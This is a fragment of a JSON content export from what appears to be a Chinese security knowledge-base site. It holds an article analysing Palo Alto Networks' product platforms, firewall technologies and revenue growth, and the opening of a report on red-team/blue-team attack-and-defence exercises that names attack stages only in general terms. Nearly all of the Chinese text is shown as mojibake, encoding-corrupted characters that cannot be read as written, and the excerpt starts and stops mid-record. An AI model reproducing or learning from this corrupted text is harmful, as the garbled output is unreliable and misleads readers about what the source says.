[https://aws.amazon.com/cn/architecture/well-architected/](https://aws.amazon.com/cn/architecture/well-architected/)\r\n- [http://www.cloudbin.cn/?p=2834](http://www.cloudbin.cn/?p=2834)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/Palo Alto Networks/Palo Alto Networkså•†ä¸šåŒ–åˆ†æ/","title":"Palo Alto Networkså•†ä¸šåŒ–åˆ†æ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Palo Alto Networkså•†ä¸šåŒ–åˆ†æ\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- Palo Alto Networks\r\n---\r\n\r\n# æ‘˜è¦\r\n\r\nPalo Altoæ˜¯ä¸‹ä¸€ä»£é˜²ç«å¢™çš„é¾™å¤´ï¼Œäº2005å¹´æˆç«‹äºç¾å›½åŠ åˆ©ç¦å°¼äºšå·ï¼Œ2007å¹´ï¼Œå…¬å¸é¦–å…ˆæå‡ºä¸‹ä¸€ä»£é˜²ç«å¢™æ¦‚å¿µï¼›2011-2020å¹´å…¬å¸è¿ç»­9å¹´è¢«è¯„é€‰ä¸ºGartnerç½‘ç»œé˜²ç«å¢™é­”åŠ›è±¡é™é¢†å¯¼è€…ã€‚æˆªè‡³2021è´¢å¹´ç¬¬ä¸€å­£åº¦ï¼Œå…¬å¸ä¸‹ä¸€ä»£é˜²ç«å¢™å·²æœ‰é€¾71000å®¶å®¢æˆ·ï¼Œå¹´æ–°å¢å®¢æˆ·æ•°è¾¾çº¦8000å®¶ã€‚\r\n\r\n- **Palo Altoä»ç«¯åˆ°äº‘ï¼Œå®‰å…¨èƒ½åŠ›è¾¹ç•Œä¸æ–­æ‹“å±•**\r\n  - å…¬å¸çš„å‘å±•å†ç¨‹å¯æ ¹æ®ç½‘ç»œå®‰å…¨æŠ€æœ¯çš„æ¼”å˜åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š\r\n    - 2007-2013å¹´ï¼Œå…¬å¸ä¸“æ³¨äºä¸‹ä¸€ä»£é˜²ç«å¢™äº§å“çš„å¼€å‘ï¼›\r\n    - 2013-2017å¹´ï¼Œå…¬å¸åœ¨ä¸‹ä¸€ä»£é˜²ç«å¢™çš„åŸºç¡€ä¸Šè½¬å‘äº‘å®‰å…¨å’Œç«¯ç‚¹é˜²æŠ¤åŠŸèƒ½çš„å¼€å‘ï¼›\r\n    - 2017å¹´å¼€å§‹ï¼Œå…¬å¸åŠ å¤§æŠ•èµ„äº‘ä¸äººå·¥æ™ºèƒ½ï¼Œå‘å±•è‡ªåŠ¨åŒ–æ•´ä½“ç½‘ç»œå®‰å…¨è§£å†³æ–¹æ¡ˆã€‚\r\n  - ç›®å‰ï¼Œå…¬å¸å·²ç»å½¢æˆä¼ä¸šå®‰å…¨å¹³å°ï¼ˆStrataï¼‰ã€äº‘å®‰å…¨å¹³å°ï¼ˆPrismaï¼‰å’Œå®‰å…¨è¿è¥å¹³å°ï¼ˆCortexï¼‰ä¸‰å¤§å®‰å…¨å¹³å°ï¼Œèƒ½å¤Ÿä¸ºç”¨æˆ·æä¾›ä»ç«¯åˆ°äº‘çš„æ•´ä½“è§£å†³æ–¹æ¡ˆã€‚\r\n- **ä¸‹ä¸€ä»£å®‰å…¨ï¼ˆNext-Generation Securityï¼‰æˆä¸ºPalo Altoé‡ç‚¹å‘åŠ›æ–¹å‘**\r\n  - ä¸‹ä¸€ä»£å®‰å…¨ä¸»è¦åŒ…æ‹¬äº‘å®‰å…¨å¹³å°ï¼ˆPrismaï¼‰ä¸å®‰å…¨è¿è¥å¹³å°ï¼ˆCortexï¼‰ï¼š\r\n    - äº‘å®‰å…¨å¹³å°ï¼ˆPrismaï¼‰æ˜¯é’ˆå¯¹å…¬æœ‰äº‘ã€ä¸å¨èƒæƒ…æŠ¥äº‘ç›¸å…³çš„è®¢é˜…æœåŠ¡é›†åˆå¹³å°ã€‚æˆªè‡³2021è´¢å¹´ç¬¬ä¸€å­£åº¦ï¼ŒFortune 100ä¼ä¸šä¸­Prisma Cloudå®¢æˆ·å æ¯”è¾¾åˆ°äº†70%ï¼ŒGlobal 2000ä¼ä¸šä¸­Prisma Cloudå®¢æˆ·å æ¯”ä¸º20%ã€‚\r\n    - å®‰å…¨è¿è¥å¹³å°ï¼ˆCortexï¼‰æ˜¯ä¸ç«¯ç‚¹é˜²æŠ¤ç›¸å…³çš„å¼€æ”¾é›†æˆçš„äººå·¥æ™ºèƒ½å®‰å…¨å¹³å°ã€‚æˆªè‡³2021è´¢å¹´ç¬¬ä¸€å­£åº¦ï¼ŒCortexå·²ç»å®Œæˆäº†è¶…è¿‡400ä¸‡ä¸ªäº‹ä»¶çš„è‡ªåŠ¨åŒ–å¤„ç†ï¼Œå·²æœ‰65%çš„Fortune 100ä¼ä¸šå’Œ34%çš„Global 2000ä¼ä¸šæˆä¸ºäº†Cortexçš„å®¢æˆ·ã€‚\r\n- **è¥æ”¶é«˜é€Ÿå¢é•¿ï¼Œè®¢é˜…æ”¶å…¥å æ¯”ä¸æ–­æå‡**\r\n  - 2012è´¢å¹´è‡³2020è´¢å¹´ï¼Œå…¬å¸è¥æ”¶å¹´å¤åˆå¢é€Ÿä¸º38.3%ï¼Œå®ç°é«˜é€Ÿå¢é•¿ã€‚\r\n  - å¾—ç›Šäºå…¬å¸äº‘å¹³å°å’Œå®‰å…¨è¿è¥å¹³å°ä¸šåŠ¡çš„å¿«é€Ÿå¢é•¿ï¼Œå…¬å¸è®¢é˜…ä¸šåŠ¡æ”¶å…¥å æ¯”å¿«é€Ÿæå‡ï¼Œåˆ°2020è´¢å¹´å·²ç»è¾¾åˆ°69%ï¼Œæˆä¸ºå…¬å¸ä¸»è¦æ”¶å…¥æ¥æºã€‚\r\n  - å…¬å¸â€œä¸‹ä¸€ä»£å®‰å…¨â€è®¢å•æ”¶å…¥å¢é•¿è¿…é€Ÿï¼Œåœ¨æ€»è®¢å•æ”¶å…¥ä¸­çš„å æ¯”ä»13%ä¸Šå‡è‡³äº†2021è´¢å¹´ç¬¬ä¸€å­£åº¦çš„24%ï¼Œæ˜¯å…¬å¸æœªæ¥æŒç»­åˆ›æ–°ä¸æ‹“å±•çš„ä¸»è¦æ–¹å‘ã€‚\r\n\r\n# äº§å“çº¿ä¸°å¯Œï¼Œæ•´ä½“è§£å†³æ–¹æ¡ˆè¡Œä¸šé¢†å…ˆ\r\n\r\n**ä¼ä¸šå®‰å…¨å¹³å°ï¼ˆStrataï¼‰æä¾›ä¸šå†…é¢†å…ˆçš„ç½‘ç»œå®‰å…¨å¥—ä»¶**\r\n\r\n- ä¼ä¸šå®‰å…¨å¹³å°ï¼ˆStrataï¼‰æ˜¯ä»¥ä¸‹ä¸€ä»£é˜²ç«å¢™è®¾å¤‡ä¸ºåŸºç¡€çš„äº§å“ç»„åˆå¹³å°ã€‚è¯¥å¹³å°ä¸‹ä¸»è¦æœ‰ä¸‹ä¸€ä»£é˜²ç«å¢™ã€ç›¸å…³è®¢é˜…æœåŠ¡å’Œç½‘ç»œå®‰å…¨ç®¡ç†å·¥å…·Panorama.\r\n- ![KgE7X1](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/KgE7X1.jpg)\r\n\r\n**ä¸‹ä¸€ä»£é˜²ç«å¢™å…·å¤‡å››å¤§ç‹¬ç‰¹æŠ€æœ¯ï¼Œå½¢æˆå¼ºæŠ€æœ¯å£å’**\r\n\r\n- **åŒºåˆ«äºä¼ ç»Ÿçš„ç»Ÿä¸€å¨èƒç®¡ç†ï¼ˆUTMï¼‰å¹³å°ï¼Œå…¬å¸çš„ä¸‹ä¸€ä»£é˜²ç«å¢™ä¾é å››é¡¹è‡ªå…¶2007å¹´è¯ç”Ÿä»¥æ¥ä¾¿å…·å¤‡çš„ç‹¬ç‰¹æŠ€æœ¯ï¼šApp-IDã€User-IDã€Content-IDå’Œå•é€šé“å¹¶è¡Œå¤„ç†ä½“ç³»ç»“æ„ï¼Œæ»¡è¶³äº†å®¢æˆ·åœ¨å¤æ‚ç¯å¢ƒä¸‹çš„ç½‘ç»œå®‰å…¨éœ€æ±‚ã€‚**2020å¹´7æœˆï¼Œå…¬å¸å‘å¸ƒ è¡Œä¸šæ·±åº¦æŠ¥å‘Šè¯·åŠ¡å¿…å‚é˜…æ­£æ–‡åé¢çš„ä¿¡æ¯æŠ«éœ²å’Œæ³•å¾‹å£°æ˜10/ 23äº†æœ€æ–°çš„ä¸‹ä¸€ä»£é˜²ç«å¢™è¿è¡Œç³»ç»Ÿç‰ˆæœ¬PAN-OS 10.0ï¼Œå…¶ä¸­çš„IoTè®¢é˜…æœåŠ¡å¸¦æ¥äº†è®¾å¤‡è¯†åˆ«æŠ€æœ¯Device-IDã€‚å¤šç§æŠ€æœ¯çš„ç»“åˆï¼Œå…±åŒæ ‘ç«‹äº†ä¸‹ä¸€ä»£é˜²ç«å¢™å¼ºå¤§çš„æŠ€æœ¯å£å’ã€‚\r\n- **App-IDæ˜¯ä¸€ç§å…ˆè¿›çš„æµé‡ç²¾ç¡®åˆ†ç±»æœºåˆ¶ï¼Œå®ç°äº†å¯¹åº”ç”¨ç¨‹åºçš„è¯†åˆ«ã€å¯è§†æ€§åŠæ§åˆ¶ã€‚**åŒºåˆ«äºä¼ ç»Ÿé˜²ç«å¢™åŸºäºç«¯å£å’Œåè®®çš„æµé‡åˆ†ç±»æœºåˆ¶ï¼Œå®ƒå¯ä»¥åœ¨è®¾å¤‡æ£€æµ‹åˆ°æµé‡ååˆ¤æ–­ä¼ è¾“æ•°æ®çš„å…·ä½“åº”ç”¨ç¨‹åºèº«ä»½ï¼Œæ— è®ºè¯¥åº”ç”¨ç¨‹åºæ˜¯å¦é€è¿‡ç½‘é¡µæœåŠ¡ã€SSLåŠ å¯†æˆ–å…¶ä»–è§„é¿æŠ€æœ¯ï¼Œä»è€Œçªç ´äº†ä¼ ç»Ÿé˜²ç«å¢™çš„æµé‡åˆ†ç±»é™åˆ¶\r\n- **User-IDå®ç°äº†ä½¿ç”¨è€…å±‚çº§çš„å¯è§†æ€§ä¸æ§åˆ¶ã€‚**é€šè¿‡ä¸MicrosoftADçš„æ— ç¼æ•´åˆï¼Œä¸‹ä¸€ä»£é˜²ç«å¢™å¯ä»¥åŠ¨æ€å¯¹åº”IPåœ°å€å’Œç”¨æˆ·ï¼Œè¿˜å¯ä»¥é’ˆå¯¹ç”¨æˆ·è¿›è¡Œæ”¿ç­–åˆ¶å®šï¼Œä»è€Œæ§åˆ¶ç”¨æˆ·å¯¹åº”ç”¨ç¨‹åºçš„ä½¿ç”¨ã€‚\r\n- **Content-IDå…·å¤‡çš„æŠ€æœ¯ç»„ä»¶å®ç°äº†é¢„é˜²æµé‡ä¸­çš„å¨èƒã€æä¾›å¯è§†æ€§ï¼Œå’Œæ–‡ä»¶ä¸æ•°æ®ç­›é€‰åŠŸèƒ½ã€‚**å¨èƒé¢„é˜²ç»„ä»¶æä¾›äº†å…¥ä¾µç›‘æµ‹å’Œé˜²å¾¡åŠŸèƒ½ï¼›ç½‘å€è¿‡æ»¤ç»„ä»¶æä¾›äº†æµ·é‡é«˜åº¦æ•´åˆã€å¯å®šåˆ¶åŒ–çš„ç½‘å€è¿‡æ»¤èµ„æ–™åº“ï¼›æ–‡ä»¶ä¸æ•°æ®ç­›é€‰ç»„ä»¶åŒæ—¶åˆ©ç”¨App-IDçš„æ·±å±‚åº”ç”¨ç¨‹åºæ£€æŸ¥åŠŸèƒ½ï¼Œå®ç°äº†å¯¹æ•æ„Ÿæ•°æ®ä¼ è¾“çš„é˜»æŒ¡ã€‚\r\n\r\n**ä¸‹ä¸€ä»£é˜²ç«å¢™äº§å“ç³»åˆ—å®Œå–„ï¼Œå®¢æˆ·ç¨³å®šå¢é•¿**\r\n\r\n- ä¸‹ä¸€ä»£é˜²ç«å¢™ç»è¿‡å¤šå¹´å‘å±•ç›®å‰åˆ†ä¸ºå®ä½“é˜²ç«å¢™PAç³»åˆ—ã€è™šæ‹Ÿé˜²ç«å¢™VMç³»åˆ—ã€å®¹å™¨é˜²ç«å¢™CNç³»åˆ—ã€‚\r\n\r\n# äº‘å®‰å…¨å¹³å°ï¼ˆPrismaï¼‰æä¾›ä¸šå†…æœ€å…¨é¢çš„äº‘å®‰å…¨äº§å“\r\n\r\nå®‰å…¨å¹³å°ï¼ˆPrismaï¼‰æ˜¯é’ˆå¯¹å…¬æœ‰äº‘ã€ä¸å¨èƒæƒ…æŠ¥äº‘ç›¸å…³çš„è®¢é˜…æœåŠ¡é›†åˆå¹³å°ã€‚äº‘å®‰å…¨å¹³å°ä¸‹çš„äº§å“å¥—ä»¶æœ‰äº‘åŸç”Ÿå®‰å…¨å¹³å°Prisma Cloudã€äº‘äº¤ä»˜å¼ç§»åŠ¨ç”¨æˆ·å®‰å…¨æœåŠ¡Prisma Accessã€å’Œä¿æŠ¤SaaSè®¿é—®å®‰å…¨æœåŠ¡Prisma SaaSã€‚å…¶ä¸­ï¼ŒPrisma Accesså’ŒCloudGenix SD-WANç›¸ç»“åˆï¼Œç»„æˆäº†ä¸šå†…æœ€å…¨é¢çš„å®‰å…¨è®¿é—®æœåŠ¡è¾¹ç¼˜SASEï¼ˆSecure Access Service Edgeï¼‰ï¼Œä¸ºç”¨æˆ·æä¾›å…·æœ‰äº‘äº¤ä»˜å®‰å…¨åŠŸèƒ½çš„å…¨çƒäº‘ç½‘ç»œã€‚\r\n\r\n- ![HwMvHg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/HwMvHg.jpg)\r\n\r\n# å®‰å…¨è¿è¥å¹³å°ï¼ˆCortexï¼‰æä¾›ä¸šå†…æœ€å…¨é¢çš„å®‰å…¨è¿è¥äº§å“å¥—ä»¶\r\n\r\nå®‰å…¨è¿è¥å¹³å°ï¼ˆCortexï¼‰æ˜¯ä¸ç«¯ç‚¹é˜²æŠ¤ç›¸å…³çš„å¼€æ”¾é›†æˆçš„äººå·¥æ™ºèƒ½å®‰å…¨å¹³å°ã€‚Cortexæ˜¯äº‘åº”ç”¨æ¡†æ¶çš„å‡çº§ï¼Œç”±Cortex Data Lakeé©±åŠ¨ï¼Œèšç„¦äºæ·±åº¦æŒ–æ˜å’Œåˆ†æï¼Œè‡´åŠ›äºå‘ç°æ½œåœ¨å¨èƒå’ŒæœªçŸ¥æ”»å‡»æ‰‹æ®µï¼Œä»¥åŠæ”»å‡»æº¯æºã€è‡ªåŠ¨åŒ–å“åº”æµç¨‹ç­‰ï¼Œä¸ºä¼ä¸šæä¾›ä¸€æµçš„æ£€æµ‹ã€è°ƒæŸ¥ã€è‡ªåŠ¨åŒ–å’Œå“åº”èƒ½åŠ›ã€‚Cortexå¹³å°ä¸‹æœ‰æ‰©å±•çš„æ£€æµ‹ä¸å“åº”å¥—ä»¶Cortex XDRã€æ‰©å±•çš„å®‰å…¨ç¼–æ’ã€è‡ªåŠ¨åŒ–å’Œå“åº”å¹³å°CortexX SOARã€ä¸“ä¸ºå®‰å…¨åˆ†æåˆ›å»ºçš„ä¼˜è´¨æ•°æ®æ¹–Cortex Data Lakeã€å’Œæƒ…æ™¯å¨èƒæƒ…æŠ¥æœåŠ¡AutoFocusã€‚\r\n\r\n# è´¢åŠ¡åˆ†æï¼šè¥æ”¶é«˜é€Ÿå¢é•¿ï¼Œè®¢é˜…æ”¶å…¥å æ¯”ä¸æ–­æå‡\r\n\r\n**å…¬å¸ä¸»è¥ä¸šåŠ¡æ”¶å…¥å§‹ç»ˆä¿æŒç€å¿«é€Ÿå¢é•¿ã€‚**2012è´¢å¹´è‡³2020è´¢å¹´ï¼Œå…¬å¸è¥æ”¶å¹´å¤åˆå¢é€Ÿä¸º38.3%ã€‚2020è´¢å¹´æ€»è¥æ”¶34.08äº¿ç¾å…ƒï¼ŒåŒæ¯”å¢é€Ÿç•¥æœ‰ä¸‹é™ï¼Œä¸»è¦åŸå› æ˜¯æ–°å† ç–«æƒ…å¯¼è‡´å®ä½“é˜²ç«å¢™éƒ¨ç½²éœ€æ±‚æœ‰æ‰€ä¸‹é™ï¼Œç›¸åº”äº§å“é”€å”®æ”¶å…¥ä¸‹é™ã€‚\r\n\r\nè´¢åŠ¡æŠ¥è¡¨è§’åº¦æ‹†åˆ†ï¼šè®¢é˜…ä¸æ”¯æŒæœåŠ¡å æ¯”å¿«é€Ÿæå‡ï¼Œæˆä¸ºä¸»è¦æ”¶å…¥æ¥æº\r\n\r\n- **è®¢é˜…ä¸æ”¯æŒæœåŠ¡æ”¶å…¥æˆä¸ºä¸»è¦æ”¶å…¥æ¥æºã€‚**å…¬å¸è´¢åŠ¡æŠ¥è¡¨å°†ä¸»è¥ä¸šåŠ¡æ”¶å…¥åˆ’åˆ†ä¸ºäº§å“é”€å”®æ”¶å…¥å’Œè®¢é˜…ä¸æ”¯æŒæœåŠ¡æ”¶å…¥ã€‚äº§å“é”€å”®ä¸»è¦åŒ…æ‹¬é˜²ç«å¢™è®¾å¤‡çš„é”€å”®ï¼Œè®¢é˜…å’Œæ”¯æŒæœåŠ¡æ”¶å…¥åŒ…æ‹¬æ–°å®¢æˆ·è´­ä¹°çš„åŸºäºé˜²ç«å¢™ä»¥åŠç‹¬ç«‹æä¾›çš„è®¢é˜…ä¸æ”¯æŒæœåŠ¡ï¼Œè¿˜æœ‰è€å®¢æˆ·çš„ç»­è®¢å’Œæ”¯æŒæœåŠ¡ã€‚2009è´¢å¹´è‡³2020è´¢å¹´ï¼Œè®¢é˜…ä¸æ”¯æŒæœåŠ¡é”€å”®æ”¶å…¥å æ¯”æŒç»­ä¸Šå‡ï¼Œäº2016è´¢å¹´è¶…è¿‡äº§å“é”€å”®æ”¶å…¥å æ¯”ï¼Œ2020è´¢å¹´å·²è¾¾åˆ°69%ï¼Œæˆä¸ºå…¬å¸è¥æ”¶ä¸»è¦ç»„æˆéƒ¨åˆ†ã€‚\r\n\r\nå…¬å¸ä¸šåŠ¡è§’åº¦æ‹†åˆ†ï¼šä¸‹ä¸€ä»£å®‰å…¨ä¸šåŠ¡æ”¶å…¥é«˜é€Ÿå¢é•¿\r\n\r\n- 2019å¹´å¼€å§‹ï¼Œå…¬å¸å°†æ€»è®¢å•æ”¶å…¥åˆ†ä¸ºäº†ä¸¤éƒ¨åˆ†ï¼šé˜²ç«å¢™å³å¹³å°ï¼ˆFirewall-as-a-Platformï¼Œç®€ç§°FwaaPï¼‰å’Œä¸‹ä¸€ä»£å®‰å…¨ï¼ˆNext-Generation Securityï¼Œç®€ç§°NGSï¼‰ã€‚\r\n- â€œé˜²ç«å¢™å³å¹³å°â€å³å…¬å¸çš„ä¸‹ä¸€ä»£é˜²ç«å¢™ä¸šåŠ¡ï¼Œè¯¥éƒ¨åˆ†è®¢å•æ”¶å…¥åŒ…æ‹¬äº†å®ä½“é˜²ç«å¢™ã€è™šæ‹Ÿé˜²ç«å¢™ç›¸å…³è®¢é˜…ä¸æ”¯æŒæœåŠ¡ã€Prisma Accessï¼ˆå±è½¯ä»¶é˜²ç«å¢™ï¼‰åŠCloudGenixçš„è®¢å•æ”¶å…¥ã€‚\r\n- â€œä¸‹ä¸€ä»£å®‰å…¨â€éƒ¨åˆ†çš„è®¢å•æ”¶å…¥åˆ™åŒ…æ‹¬äº†äº‘å®‰å…¨å¹³å°ï¼ˆPrismaï¼‰ä¸å®‰å…¨è¿è¥å¹³å°ï¼ˆCortexï¼‰å¥—ä»¶è®¢å•ï¼Œä»¥åŠè™šæ‹Ÿé˜²ç«å¢™è®¢å•æ‰€è´¡çŒ®çš„æ”¶å…¥ã€‚\r\n\r\n**2021è´¢å¹´ç¬¬ä¸€å­£åº¦ï¼Œå…¬å¸å°†åŸå…ˆåˆ’åˆ†çš„ä¸¤å¤§ä¸šåŠ¡å¾®è°ƒå¹¶é‡æ–°å®šä¹‰ä¸ºâ€œç½‘ç»œå®‰å…¨â€å’Œâ€œäº‘ä¸äººå·¥æ™ºèƒ½â€ã€‚**\r\n\r\n![O4vvoz](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/O4vvoz.jpg)\r\n\r\n![uCOJuf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/uCOJuf.jpg)\r\n\r\n\r\n\r\n# æœªæ¥å‘å±•æ–¹å‘ï¼šæœºå™¨å­¦ä¹ æŠ€æœ¯ä¸5G\r\n\r\næœªæ¥å…¬å¸å°†ç»§ç»­åœ¨æœºå™¨å­¦ä¹ ã€äººå·¥æ™ºèƒ½ç­‰æ–¹å‘åŠ å¤§æŠ•å…¥ã€‚2020å¹´6æœˆ17æ—¥ï¼Œå…¬å¸æ­£å¼å‘å¸ƒäº†ä¸šç•Œç¬¬ä¸€æ¬¾åŸºäºæœºå™¨å­¦ä¹ çš„ä¸‹ä¸€ä»£é˜²ç«å¢™ç‰ˆæœ¬PAN-OS 10.0ã€‚è¯¥æ›´æ–°ç‰ˆæœ¬å°†æœºå™¨å­¦ä¹ æŠ€æœ¯åµŒå…¥é˜²ç«å¢™æ ¸å¿ƒï¼Œä¸»åŠ¨å¸®åŠ©å¹¶æ™ºèƒ½åœ°é˜»æ­¢å¨èƒï¼Œä¿æŠ¤ç‰©è”ç½‘è®¾å¤‡ï¼Œå¹¶æ¨èå®‰å…¨ç­–ç•¥ã€‚æ–°ç‰ˆæœ¬é˜²ç«å¢™é›†åˆäº†å››å¤§åˆ›æ–°åŠŸèƒ½ï¼šåŸºäºæœºå™¨å­¦ä¹ æŠ€æœ¯çš„æœ¬åœ°æ¶æ„è½¯ä»¶å’Œç½‘ç»œé’“é±¼é˜²å¾¡åŠŸèƒ½ã€é›¶å»¶è¿Ÿç­¾åæ›´æ–°ã€åŸºäºæœºå™¨å­¦ä¹ æŠ€æœ¯çš„é›†æˆç‰©è”ç½‘å®‰å…¨ï¼Œå’ŒåŸºäºæœºå™¨å­¦ä¹ æŠ€æœ¯çš„å®‰å…¨ç­–ç•¥ã€‚åŸºäºæœºå™¨å­¦ä¹ æŠ€æœ¯çš„ä¸‹ä¸€ä»£é˜²ç«å¢™å°†åœ¨ä»¥ä¸‹å››ç‚¹ä¸ºä¼ä¸šæé«˜å®‰å…¨è¿è¥æ•ˆç‡ï¼š\r\n\r\n- å³æ—¶é˜²èŒƒé«˜è¾¾95%çš„æœªçŸ¥æ–‡ä»¶å’ŒWebå¨èƒï¼›\r\n- è‡ªåŠ¨æä¾›å®‰å…¨ç­–ç•¥å»ºè®®ï¼›\r\n- æä¾›å®æ—¶é˜²å¾¡åŠŸèƒ½ï¼›\r\n- æ‰©å±•å¯è§†æ€§å’Œå®‰å…¨æ€§è‡³æ‰€æœ‰è®¾å¤‡ï¼Œæ— éœ€éƒ¨ç½²é¢å¤–çš„ä¼ æ„Ÿå™¨ã€‚\r\n\r\n# æ¥æºï¼šæµ·å¤–ç½‘å®‰ç ”ç©¶ç³»åˆ—ä¹‹PaloAltoï¼šâ€œä¸‹ä¸€ä»£â€å®‰å…¨é¢†å¯¼è€…\r\n\r\n- [https://docs.google.com/viewerng/viewer?url=https://pdf.dfcfw.com/pdf/H3_AP202103121471521418_1.pdf](https://docs.google.com/viewerng/viewer?url=https://pdf.dfcfw.com/pdf/H3_AP202103121471521418_1.pdf)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/è¡Œä¸šæŠ¥å‘Š/å¹´åº¦å¤§å‹æ”»é˜²å®æˆ˜å…¨æ™¯ï¼šçº¢è“æ·±åº¦æ€è€ƒåŠå¤šæ–¹è”åˆæ¨æ¼”/","title":"å¹´åº¦å¤§å‹æ”»é˜²å®æˆ˜å…¨æ™¯ï¼šçº¢è“æ·±åº¦æ€è€ƒåŠå¤šæ–¹è”åˆæ¨æ¼”"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å¹´åº¦å¤§å‹æ”»é˜²å®æˆ˜å…¨æ™¯ï¼šçº¢è“æ·±åº¦æ€è€ƒåŠå¤šæ–¹è”åˆæ¨æ¼”\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- çº¢è“å¯¹æŠ—\r\n---\r\n\r\næ¦‚è¦ï¼šæœ¬æŠ¥å‘Šé€šè¿‡å…­å¼ å®æˆ˜æ¨æ¼”å›¾ï¼Œç»“åˆå®‰å…¨èƒ½åŠ›è€…ã€ç¬¬ä¸‰æ–¹æœºæ„å’Œå®‰å…¨è¿è¥è€…çš„è§‚ç‚¹ï¼Œå±•ç¤ºäº†æ”»å‡»æ–¹ä»æ”»å‡»é¢åˆ†æã€è¾¹ç•Œçªç ´ã€æ¨ªå‘æ¸—é€åˆ°é¶æ ‡æ”»é™·çš„æ”»å‡»è¿‡ç¨‹ï¼Œé˜²å®ˆæ–¹ä»åŸºç¡€ä¿æŠ¤ã€å¼ºåŒ–ä¿æŠ¤åˆ°ååŒä¿æŠ¤çš„çºµæ·±é˜²å¾¡ä½“ç³»ï¼Œæç»˜äº†å¤§å‹ç½‘ç»œå®‰å…¨æ”»é˜²å®æˆ˜æ¼”ä¹ çš„å…¨æ™¯å¯¹è±¡å’Œæ­¥éª¤æ¨æ¼”ã€‚\r\n\r\n![OCFspR](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/OCFspR.jpg)\r\n\r\nå›¾è§£ï¼šçº¢è“åŒæ–¹å›´ç»•ä¿æŠ¤å¯¹è±¡ï¼ˆç¥ç»ä¸­æ¢é¶æ ‡ï¼‰è¿›è¡Œæ”»å‡»ä¸é˜²å¾¡ç­–ç•¥åˆ¶å®šï¼Œåœ¨æ”»å‡»é¢åˆ†æä¸æš´éœ²é¢æ”¶æ•›ã€è¾¹ç•Œçªç ´ä¸é˜²å¾¡ã€æ¨ªå‘æ¸—é€å’ŒåŒºåŸŸæ§åˆ¶ï¼Œæ ¸å¿ƒåŒºæ”»é™·æˆ–å¼ºæ§å¼€å±•æ¨æ¼”ï¼›\r\n\r\né‡ç‚¹: æ”»å‡»é˜²å®ˆç­–ç•¥çš„åˆ¶å®šçŠ¹å¦‚ä½œæˆ˜è®¡åˆ’å’Œé˜²å¾¡è®¡åˆ’æ˜¯æ¨æ¼”çš„å‰æï¼Œä¸åŒé˜¶æ®µåˆ¶å®šä¸åŒçš„æ”»å‡»å’Œé˜²å®ˆç­–ç•¥ï¼Œæ”»å‡»æ–¹æ€»ä½“æ˜¯ç”±ç‚¹åˆ°é¢å†å›åˆ°ç‚¹ï¼Œé˜²å®ˆæ–¹åˆ™æ˜¯ç”±é¢åˆ°é¢å†å›åˆ°æ ¸å¿ƒç‚¹ï¼Œç­–ç•¥æ–¹æ³•ä¸æ”»é˜²åŒæ–¹çš„èƒ½åŠ›ç»“åˆè¿›è¡Œå±‚å±‚æ¸—é€å’Œçºµæ·±é˜²å¾¡ï¼›\r\n\r\næ”»å‡»ï¼šç­–ç•¥åˆ¶å®š-æ”»å‡»é¢åˆ†æ-è¾¹ç•Œçªç ´-æ¨ªå‘æ¸—é€-æ”»é™·ç›®æ ‡-æ½œä¼/æ©ç›–/æ’¤é€€ï¼›\r\n\r\né˜²å¾¡ï¼šç­–ç•¥åˆ¶å®š-æš´éœ²é¢æ”¶æ•›-è¾¹ç•Œé˜²æŠ¤-åŒºåŸŸæ§åˆ¶-å¼ºåŒ–æ§åˆ¶-åŸºç¡€/å¼ºåŒ–/ååŒï¼›\r\n\r\n![BtcvtE](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/BtcvtE.jpg)\r\n\r\nå›¾è§£ï¼šçº¢è“æ”»å®ˆåŒæ–¹å›´ç»•ä¿æŠ¤å¯¹è±¡ï¼ˆç¥ç»ä¸­æ¢é¶æ ‡ï¼‰è¿›è¡Œæ”»å‡»ä¸é˜²å¾¡ç­–ç•¥åˆ¶å®šåï¼Œç¬¬ä¸€æ­¥åŒæ–¹å¼€å±•çš„åˆ™æ˜¯æ”»å‡»é¢åˆ†æä¸æš´éœ²é¢æ”¶æ•›ï¼›\r\n\r\né‡ç‚¹ï¼šäº’è”ç½‘ä¿¡æ¯ã€ç»„ç»‡ç»“æ„ã€äººå‘˜ä¿¡æ¯ã€ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆå¼€æºå¹³å°ã€äº‘å¹³å°ç­‰ï¼‰ã€ä¾›åº”é“¾ä½“ç³»ï¼ˆè®¾å¤‡ã€äººå‘˜ã€æœåŠ¡ã€DNSã€ISPã€ICPï¼‰ç­‰ï¼Œä»¥åŠå¯¹å¤–æœåŠ¡çš„ä¸šåŠ¡åº”ç”¨å±‚ã€ç³»ç»Ÿå±‚ã€æ•°æ®å±‚ã€ç½‘ç»œå±‚ã€å¹³å°å±‚ç­‰çš„å¼±ç‚¹ä»¥åŠäº’è”ç½‘IPã€ç«¯å£ã€åŸŸåã€VPNã€é‚®ä»¶ç­‰ä»¥åŠå„æ–¹é¢çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå£ä»¤ç­‰ï¼›\r\n\r\næ”»å‡»ï¼šä¿¡æ¯æ”¶é›†ã€ç¤¾å·¥ã€å¤šå±‚æ‰«æã€çˆ¬è™«ã€é’“é±¼ã€æ’åº“ã€SQLæ³¨å…¥ç­‰ï¼›\r\n\r\né˜²å¾¡ï¼šè§„èŒƒä¸Šçº¿ç¬¬ä¸‰æ–¹å¹³å°å®‰å…¨è¦æ±‚ã€æé«˜ä¾›åº”é“¾æœåŠ¡å•†å®‰å…¨è¦æ±‚ã€è§„èŒƒç»„ç»‡äº’è”ç½‘ä¿¡æ¯ã€å‡å°‘ä¸å¿…è¦çš„äº’è”ç½‘å‡ºå£